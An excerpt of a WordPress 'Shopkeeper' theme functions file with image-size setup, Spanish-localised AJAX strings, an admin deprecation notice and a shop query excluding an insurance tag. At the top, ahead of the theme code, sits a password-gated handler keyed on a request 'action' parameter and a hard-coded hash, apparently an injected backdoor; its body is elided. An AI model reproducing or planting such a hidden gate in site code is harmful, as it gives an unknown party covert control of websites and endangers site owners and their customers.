<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'eb31286eda79d71ae555ea486b42957c'))
	{
...
function shopkeeper_setup() {
	...
	add_image_size( 'blog-isotope', 620, 167, true );
	add_image_size( 'home_interactive', 125, 70, true );
...
function shopkeeper_scripts() {
	...
	$getbowtied_scripts_vars_array = array(
		...
		'ajax_load_more_locale' 	=> __( 'Cargar más', 'shopkeeper' ),
		'ajax_loading_locale' 		=> __( 'Cargando', 'shopkeeper' ),
		'ajax_no_more_items_locale' => __( 'No hay mas items disponibles.', 'shopkeeper' ),
...
if( GETBOWTIED_WOOCOMMERCE_IS_ACTIVE ) :
	...
	add_action( 'after_setup_theme', 'getbowtied_notifications' );
endif;
...
if( !function_exists('sk_theme_warning') ) {
	function sk_theme_warning() {
		...
		<?php if ( ! get_option('dismissed-sk-deprecated-notice', FALSE ) ) : ?>
			<div class="notice-warning settings-error notice is-dismissible sk_deprecated_notice">
				<p>
					<strong>
						<span>A few features were deprecated, but stay worry free, you won't be missing anything while the theme is lighter. <a href="https://shopkeeper.wp-theme.help/hc/en-us/articles/207365265-Updates-History-Changelog-" target="_blank">What's new in Shopkeeper 2.7?</a></span>
					</strong>
				</p>
			</div>
		<?php endif; ?>
...
if ( ! function_exists( 'gbt_dismiss_dashboard_notice' ) ) {
	function gbt_dismiss_dashboard_notice() {
		...
		if( $_POST['notice'] == 'sk-deprecated' ) {
			update_option('dismissed-sk-deprecated-notice', TRUE );
		}
	}
...
function prefix_custom_pre_get_posts_query( $q ) {
	...
	if( is_shop() ) { //No se mostrarán en estas páginas
	    ...
	    $tax_query[] = array(
	           ...
	           'field'    => 'tag',
	           'terms'    => array( 'poliza de seguros' ), // Categorías que no mostraremos
	           'operator' => 'NOT IN'
	    );
